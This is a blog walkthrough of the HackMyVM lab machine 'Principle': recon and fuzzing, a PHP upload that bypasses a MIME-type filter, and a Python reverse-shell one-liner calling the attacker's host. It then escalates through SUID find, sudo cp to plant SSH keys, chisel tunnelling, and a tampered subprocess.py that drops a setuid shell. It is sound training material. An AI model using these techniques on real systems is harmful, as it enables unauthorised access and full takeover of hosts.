---
layout: post
title: "HackMyVM: Principle"
---

A convoluted machine making you look around in order to solve it. Confusing, but the flow is simple when you look back.

### Recon

**nmap**

```
Starting Nmap 7.80 ( https://nmap.org ) at 2023-11-23 12:16 EST  
Nmap scan report for T4L0S.HMV (192.168.56.111)  
Host is up (0.00036s latency).  
Not shown: 999 filtered ports  
PORT   STATE SERVICE VERSION  
80/tcp open  http    nginx 1.22.1  
|_http-server-header: nginx/1.22.1  
|_http-title: Console  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 6.76 seconds
```

The only port open is 80, so let's begin.

**website**

nmap will also tell us that there's a robots.txt file, with some allowed and disallowed entries. Viewing it, this is what we see:
```
User-agent: *
Allow: /hi.html
Allow: /investigate
Disallow: /hackme
```

We'll look at `hi.html` first.
![](https://cybersec.deadandbeef.com/images/Principle/hihtml.png)

There's not much here, just a brief conversation. Onto `/investigate`.
![](https://cybersec.deadandbeef.com/images/Principle/investigate.png)

More substance here, but no clues. Let's check the source.
![](https://cybersec.deadandbeef.com/images/Principle/investigatesource.png)

So now we know that there's something in the `/investigate` directory. Let's ffuf it up. In terms of file extensions, we'll try out `.txt` first.
```
thehated@TRYHARDER:/dev/shm$ ffuf -u http://192.168.56.111/investigate/FUZZ.txt -w ~/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt

       /'___\  /'___\           /'___\          
      /\ \__/ /\ \__/  __  __  /\ \__/          
      \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\         
       \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/         
        \ \_\   \ \_\  \ \____/  \ \_\          
         \/_/    \/_/   \/___/    \/_/          
  
      v1.1.0  
________________________________________________  
  
:: Method           : GET  
:: URL              : http://192.168.56.111/investigate/FUZZ.txt  
:: Wordlist         : FUZZ: /home/thedoug/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt  
:: Follow redirects : false  
:: Calibration      : false  
:: Timeout          : 10  
:: Threads          : 40  
:: Matcher          : Response status: 200,204,301,302,307,401,403  
________________________________________________  
  
rainbow_mystery         [Status: 200, Size: 596, Words: 1, Lines: 9]  
:: Progress: [87650/87650] :: Job [1/1] :: 10956 req/sec :: Duration: [0:00:08] :: Errors: 0 ::
```

There's a text file here. Let's look at what it has.
```
QWNjb3JkaW5nIHRvIHRoZSBPbGQgVGVzdGFtZW50LCB0aGUgcmFpbmJvdyB3YXMgY3JlYXRlZCBi
eSBHb2QgYWZ0ZXIgdGhlIHVuaXZlcnNhbCBGbG9vZC4gSW4gdGhlIGJpYmxpY2FsIGFjY291bnQs
IGl0IHdvdWxkIGFwcGVhciBhcyBhIHNpZ24gb2YgdGhlIGRpdmluZSB3aWxsIGFuZCB0byByZW1p
bmQgbWVuIG9mIHRoZSBwcm9taXNlIG1hZGUgYnkgR29kIGhpbXNlbGYgdG8gTm9haCB0aGF0IGhl
IHdvdWxkIG5ldmVyIGFnYWluIGRlc3Ryb3kgdGhlIGVhcnRoIHdpdGggYSBmbG9vZC4KTWF5YmUg
dGhhdCdzIHdoeSBJIGFtIGEgcm9ib3Q/Ck1heWJlIHRoYXQgaXMgd2h5IEkgYW0gYWxvbmUgaW4g
dGhpcyB3b3JsZD8KClRoZSBhbnN3ZXIgaXMgaGVyZToKLS4uIC0tLSAtLSAuLSAuLiAtLiAvIC0g
Li4uLi0gLi0uLiAtLS0tLSAuLi4gLi0uLS4tIC4uLi4gLS0gLi4uLQo=
```

Some base64. Decoding it, we have some explanation and morse code.
```
According to the Old Testament, the rainbow was created by God after the universal Flood. In the biblical account, it would appear as a sign of the divine will and to remind men of the promise made by God himself to Noah that he would never again destroy the earth with a flood.
Maybe that's why I am a robot?
Maybe that is why I am alone in this world?

The answer is here:
-.. --- -- .- .. -. / - ....- .-.. ----- ... .-.-.- .... -- ...-
```

Let's decode some more:
```
DOMAIN T4L0S.HMV
```

This is a new domain that the website can be accessed under; let's insert this into our host file with the line `<IP> t4l0s.hmv`. Once it's done, we visit the wensite again, employing this domain. We see an entirely new website from the one we saw before.

**second website**

![](https://cybersec.deadandbeef.com/images/Principle/taloshmv.png)

Wacky little site here, but nothing in the form of clues here. Let's look for some subdomains. We'll use the biggest one available to us and have a whack at it.
```
thedoug@TRYHARDER:/dev/shm$ ffuf -u http://t4l0s.hmv -H 'Host: FUZZ.t4l0s.hmv' -w ~/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -fs 615  
  
       /'___\  /'___\           /'___\          
      /\ \__/ /\ \__/  __  __  /\ \__/          
      \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\         
       \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/         
        \ \_\   \ \_\  \ \____/  \ \_\          
         \/_/    \/_/   \/___/    \/_/          
  
      v1.1.0  
________________________________________________  
  
:: Method           : GET  
:: URL              : http://t4l0s.hmv  
:: Wordlist         : FUZZ: /home/thedoug/SecLists/Discovery/DNS/subdomains-top1million-110000.txt  
:: Header           : Host: FUZZ.t4l0s.hmv  
:: Follow redirects : false  
:: Calibration      : false  
:: Timeout          : 10  
:: Threads          : 40  
:: Matcher          : Response status: 200,204,301,302,307,401,403  
:: Filter           : Response size: 615  
________________________________________________  
  
hellfire                [Status: 200, Size: 1659, Words: 688, Lines: 52]  
:: Progress: [114441/114441] :: Job [1/1] :: 7629 req/sec :: Duration: [0:00:15] :: Errors: 0 ::
```

There's a subdomain! What sorts of exciting exploits does it have for us? Let's visit it.

**third website**

![](https://cybersec.deadandbeef.com/images/Principle/hellfiretaloshmv.png)

A question: what extension do these files have? Trying `index.html`, this returns a 404 not found. Trying `index.php`, the page loads normally. This means we have php files on this website, and we can look for more. ffuf again!
```
thehated@TRYHARDER:/dev/shm$ ffuf -u http://hellfire.t4l0s.hmv/FUZZ.php -w ~/SecLists/Discovery/Web-Content/raft-small-words.txt    
  
       /'___\  /'___\           /'___\          
      /\ \__/ /\ \__/  __  __  /\ \__/          
      \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\         
       \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/         
        \ \_\   \ \_\  \ \____/  \ \_\          
         \/_/    \/_/   \/___/    \/_/          
  
      v1.1.0  
________________________________________________  
  
:: Method           : GET  
:: URL              : http://hellfire.t4l0s.hmv/FUZZ.php  
:: Wordlist         : FUZZ: /home/thedoug/SecLists/Discovery/Web-Content/raft-small-words.txt  
:: Follow redirects : false  
:: Calibration      : false  
:: Timeout          : 10  
:: Threads          : 40  
:: Matcher          : Response status: 200,204,301,302,307,401,403  
________________________________________________  
  
upload                  [Status: 200, Size: 748, Words: 67, Lines: 29]  
index                   [Status: 200, Size: 1659, Words: 688, Lines: 52]  
output                  [Status: 200, Size: 1348, Words: 490, Lines: 62]  
:: Progress: [43003/43003] :: Job [1/1] :: 10750 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```

Upload? That must be an attack vector. Let's visit that page, shall we?

### Foothold

![](https://cybersec.deadandbeef.com/images/Principle/uploadphp.png)

Since this server executes php files, let's try to upload one!

![](https://cybersec.deadandbeef.com/images/Principle/uploadphpdenied.png)

Well, this doesn't work. Now, let's try to make the server think it's an image by changing the MIME type to one the server accepts using Burp Suite.

![](https://cybersec.deadandbeef.com/images/Principle/burp.png)

Bingo! The server is fooled and even gives us the path to the file itself: `archivos/shell.php`. But can we actually execute the php file?

![](https://cybersec.deadandbeef.com/images/Principle/commandexec.png)

Hype. We can execute commands on the server, which means we can get a shell on the server too. We'll employ the single-line Python command in order to obtain the reverse shell: `python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("192.168.56.1",9999));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'`

Mind the IP and port again. When we URL encode this payload and execute it, with a listener active, we do indeed get that shell.
```
thehated@TRYHARDER:/dev/shm$ nc -lnvp 9999  
Ncat: Version 7.80 ( https://nmap.org/ncat )  
Ncat: Listening on :::9999  
Ncat: Listening on 0.0.0.0:9999  
Ncat: Connection from 192.168.56.111.  
Ncat: Connection from 192.168.56.111:54606.  
www-data@principle:~/hellfire.t4l0s.hmv/archivos$
```

### User

One of the first checks I run on any system is for SUID files, as this allows us to elevate to other users (or perhaps even the root one).
```
www-data@principle:~/hellfire.t4l0s.hmv/archivos$ find / -perm -4000 2>/dev/null  
/usr/lib/dbus-1.0/dbus-daemon-launch-helper  
/usr/lib/openssh/ssh-keysign  
/usr/bin/chfn  
/usr/bin/gpasswd  
/usr/bin/mount  
/usr/bin/passwd  
/usr/bin/sudo  
/usr/bin/find  
/usr/bin/su  
/usr/bin/chsh  
/usr/bin/umount  
/usr/bin/newgrp
```

`find`. That's one of the easiest binaries to exploit through SUID, with a shell obtained through this command: `find -exec /bin/sh -p \; -quit`. Who are we here? `id` will tell us just that.
```
uid=33(www-data) gid=33(www-data) euid=1000(talos) groups=33(www-data)
```

Talos is who we are. There's a file `note.txt` in their home directory, which reads like this:
```
Congratulations! You have made it this far thanks to the manipulated file I left you, I knew you would make it!  
Now we are very close to finding this false God Elohim.  
I left you a file with the name of one of the 12 Gods of Olympus, out of the eye of Elohim ;)  
The tool I left you is still your ally. Good luck to you.
```

Now we need to find a file (with `find` I presume). It's telling us to search the file system for a file with a Greek god as its name. I decided to translate these names into Spanish, as the `archivos` folder in the web directory was a hint that some parts of this box were in the language. The list of Greek gods went as follows:
```
Afrodita, Apolo, Zeus, Hera, Poseidon, Ares, Atenea, Hermes, Artemisa, Hefesto, Demeter, Hestia
```

Searching for any file with one of these names, we run the command `find / -iname *Afrodita* 2>/dev/null` to search for the first one case insensitively. One result comes up: `/etc/selinux/Afrodita.key`. This must be a key of some kind, and it's a text file reading:
```
Here is my password:  
Hax0rModeON  
  
Now I have done another little trick to help you reach Elohim.  
REMEMBER: You need the access key and open the door. Anyway, he has a bad memory and that's why he keeps the lock coded and hidden at home.
```

Could this be our password? We never got it when we elevated to the talos user through SUID, so maybe it is. Trying it out with `su`, it is their password. I then check if `sudo` permits us anything under the talos user. After a swift `sudo -l`, it does (no password's even required).
```
talos@principle:~$ sudo -l  
Matching Defaults entries for talos on principle:  
   env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty  
  
User talos may run the following commands on principle:  
   (elohim) NOPASSWD: /bin/cp
```

With `cp`, we're able to copy any file we want into elohim's home directory. It's important to note here that SSH is running, but inaccessible from the outside.
```
talos@principle:~$ ss -lntp  
State                Recv-Q               Send-Q                             Local Address:Port                             Peer Address:Port              Process                 
LISTEN               0                    511                                      0.0.0.0:80                                    0.0.0.0:*                                         
LISTEN               0                    128                                      0.0.0.0:3445                                  0.0.0.0:*                                         
LISTEN               0                    511                                         [::]:80                                       [::]:*                                         
LISTEN               0                    128                                         [::]:3445                                     [::]:*                                         
talos@principle:~$ nc 127.0.0.1 3445  
SSH-2.0-OpenSSH_9.2p1 Debian-2
```

What if we could have elohim authenticate to SSH with a public-private key pair? Normally, you put a public key in the `authorized_keys` file to allow the person with the private key to authenticate as the user in question. We can generate an SSH key for elohim on our local machine with the command `ssh-keygen -f elohim` and transport it to the box through a Python HTTP server (`python3 -m http.server`). After downloading the public key to the box, we employ our privileges to copy it into elohim's SSH directory.
```
sudo -u elohim cp elohim.pub /home/gehenna/.ssh/authorized_keys
```

Since the SSH server isn't running on the outside, we need a tool to forward this port so that we can access it. `chisel` is here to save the day, though. It's a tool which serves as both a client and server for port forwarding. Transporting it onto the box and setting it up as a reverse port forward with these commands, port 3445 is now accessible for login.
```
Client: ./chisel client <IP>:<PORT> R:3445
Server: ./chisel server --reverse --port <PORT>
```

Whee! We can now log in as elohim with the private key that we have from the key generation.
```
thehated@TRYHARDER:/dev/shm$ ssh -i ~/ExploitScripts/elohim elohim@127.0.0.1 -p3445  
  
  
Son, you didn't listen to me, and now you're trapped.  
You've come a long way, but this is the end of your journey.  
  
elohim@principle:~$
```

### Root

Checking in on `id`, there's an unusual group attached to us:
```
uid=1001(elohim) gid=1001(elohim) groups=1001(elohim),1002(sml)
```

When I see a group I'm not familiar with, I run `find` to see if there's any files or folders it owns. A surprising file shows up that sml owns: `/usr/lib/python3.11/subprocess.py`. The script we can execute as root with `sudo` is in Python:
```
#!/usr/bin/python3  
  
import os  
import subprocess  
  
def eliminar_archivos_incorrectos(directorio):  
   extensiones_validas = ['.jpg', '.png', '.gif']  
      
   for nombre_archivo in os.listdir(directorio):  
       archivo = os.path.join(directorio, nombre_archivo)  
          
       if os.path.isfile(archivo):  
           _, extension = os.path.splitext(archivo)  
              
           if extension.lower() not in extensiones_validas:  
               os.remove(archivo)  
               print(f"Archivo eliminado: {archivo}")  
  
directorio = '/var/www/hellfire.t4l0s.hmv/archivos'  
  
eliminar_archivos_incorrectos(directorio)  
  
def enviar_mensaje_usuarios_conectados():  
   proceso = subprocess.Popen(['who'], stdout=subprocess.PIPE)  
   salida, _ = proceso.communicate()  
   lista_usuarios = salida.decode().strip().split('\n')  
   usuarios_conectados = [usuario.split()[0] for usuario in lista_usuarios]  
   mensaje = f"I have detected an intruder, stealing accounts: {', '.join(usuarios_conectados)}"  
   subprocess.run(['wall', mensaje])  
  
enviar_mensaje_usuarios_conectados()
```

Since the subprocess library is used, we can exploit the `__init__` function to execute a shell command when an instance of the Popen class is created. Before editing the file, we need to break out of the rbash jail we're currently in. Luckily, it's simple to break out of it, just by running `sh`. Let's edit that file now.
```
   def __init__(self, args, bufsize=-1, executable=None,  
                stdin=None, stdout=None, stderr=None,  
                preexec_fn=None, close_fds=True,  
                shell=False, cwd=None, env=None, universal_newlines=None,  
                startupinfo=None, creationflags=0,  
                restore_signals=True, start_new_session=False,  
                pass_fds=(), *, user=None, group=None, extra_groups=None,  
                encoding=None, errors=None, text=None, umask=-1, pipesize=-1,  
                process_group=None):  
       """Create new Popen instance."""  
       os.system("cp /bin/bash /tmp/shell; chmod 4755 /tmp/shell")  
       if not _can_fork_exec:  
           raise OSError(  
               errno.ENOTSUP, f"{sys.platform} does not support processes."  
           )
```

This is now what the `__init__` function looks like, and upon running the script with `sudo python3 /opt/reviewer.py`, we can now observe the `shell` file in the `/tmp` directory.
```
$ ls /tmp  
shell  systemd-private-8430ead48167419aadac0c6f73399289-systemd-logind.service-zl6npT  systemd-private-8430ead48167419aadac0c6f73399289-systemd-timesyncd.service-9P1VvU
```

Executing `/tmp/shell -p`, we are officially root. Wow, was that a long journey.
```
shell-5.2#
```